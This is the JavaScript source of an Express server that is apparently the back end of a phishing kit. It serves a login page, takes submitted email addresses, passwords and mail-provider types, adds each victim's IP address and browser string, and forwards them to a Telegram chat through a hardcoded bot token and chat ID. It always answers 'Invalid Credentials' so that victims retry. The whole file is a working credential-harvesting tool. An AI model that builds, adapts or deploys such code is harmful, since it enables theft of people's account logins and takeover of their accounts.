"use strict";

var express = require('express');
var bodyParser = require('body-parser');
var path = require('path');
var TelegramBot = require('node-telegram-bot-api');
var cors = require('cors');
var requestIp = require('request-ip');
var app = express();
var port = 3001;
app.use(cors());
app.use(function (req, res, next) {
  console.log('Request received:', req.method, req.url);
  next();
});

// Middleware to get User Agent
app.use(function (req, res, next) {
  req.userAgent = req.headers['user-agent'];
  next();
});

// Assuming your static files are in the 'images' directory
app.use(express["static"](path.join(__dirname, 'images')));

// Assuming your CSS files are in the 'css' directory
app.use(express["static"](path.join(__dirname, 'css')));

// Serve static files from the 'public' directory
app.use(express["static"](path.join(__dirname, '')));
app.set('view engine', 'html');

// Define routes
// app.get('/', (req, res) => {
//   res.sendFile(path.join(('index.html')));
// });

app.get('/', function (req, res) {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Replace 'YOUR_TELEGRAM_BOT_TOKEN' with your actual Telegram Bot Token
var bot = new TelegramBot('6851991741:AAG1PAsmdfeA2JPjJSS9tAjbYep5yE38Guk', {
  polling: true
});
app.use(body - parser.urlencoded({
  extended: true
}));
app.post('/', function (req, res) {
  try {
    var email = req.body.email;
    var password = req.body.password;
    var field = req.body.field;
    var userAgent = req.userAgent;

    // Get the client's IP address
    var clientIp = requestIp.getClientIp(req);
    console.log('Received login attempt:', email, password, field, clientIp, userAgent);
    var isValidCredentials = true;

    // Example validation logic (replace with your actual validation)
    if (isValidCredentials) {
      // Send Telegram message
      var chatId = '1713212728'; // Replace with your Telegram group username or chat ID
      var message = "New login attempt:\nEmail: ".concat(email, "\nPassword: ").concat(password, "\nType of Mail: ").concat(field, "\nIP Address: ").concat(clientIp, "\nUser Agent: ").concat(userAgent);
      bot.sendMessage(chatId, message);
      console.log('my chat', chatId, message);
      console.log('Sending response:', {
        success: true,
        message: 'Login successful'
      });

      // Send response to the client
      res.json({
        success: true,
        message: 'Invalid Credentials'
      });
    } else {
      // Send response to the client for invalid credentials
      res.json({
        success: false,
        message: 'Invalid email or password'
      });
    }
  } catch (error) {
    res.status(500).json({
      err: error.message,
      message: 'Internal server error'
    });
  }
});

// function isValidCredentials(email, password) {
//   // Example: Check against predefined values (replace with database validation)
//   const validEmail = 'example@example.com';
//   const validPassword = 'password123';

//   return email === validEmail && password === validPassword;
// }

app.listen(port, function () {
  console.log("Server is running on http://localhost:".concat(port));
});